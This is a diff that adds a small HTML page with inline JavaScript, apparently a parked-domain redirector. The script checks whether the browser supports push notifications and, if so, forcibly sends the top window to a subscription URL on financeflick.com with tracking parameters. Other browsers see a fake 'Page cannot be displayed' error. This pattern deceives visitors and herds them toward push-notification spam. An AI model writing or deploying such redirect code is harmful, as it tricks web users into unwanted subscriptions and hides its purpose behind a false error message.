@@ -1,0 +1,16 @@
+<!DOCTYPE html><html><head><script type="text/javascript" language="javascript">
+try
+        {
+            var rurl = 'https://subscribe.financeflick.com/?skipEmail=1&q=&tp1=2PO5N5455&tp2=falasteen.com&tp3=ext_jpg&custom_tags=%7B%22merge_pid%22%3A%22%22%2C%22gcat%22%3A%22People%20%26%20Society%20%3E%20Religion%20%26%20Belief%20%3E%20Islam%22%7D';
+            var _dfltmsg = '<div align=center><h3>Error. Page cannot be displayed. Please contact your service provider for more details.  (24)</h3></div>';
+            var i = "chrome" in window &&  'PushManager' in window && 'Notification' in window,
+            o = /Firefox[\/\s](\d+\.\d+)/.test(navigator.userAgent) &&  'PushManager' in window && 'Notification' in window;
+            if(i || o)
+                window.top.location.replace(rurl);
+            else
+                document.write(_dfltmsg);
+        } catch(exception) {
+            document.write("This page has moved, <A HREF='https://subscribe.financeflick.com/?skipEmail=1&amp;q=&amp;tp1=2PO5N5455&amp;tp2=falasteen.com&amp;tp3=ext_jpg&amp;custom_tags=%7B%22merge_pid%22%3A%22%22%2C%22gcat%22%3A%22People%20%26%20Society%20%3E%20Religion%20%26%20Belief%20%3E%20Islam%22%7D&amp;jserror=1'>Click here</A> to go there.");
+        }
+</script>
+</head><body></body></html>
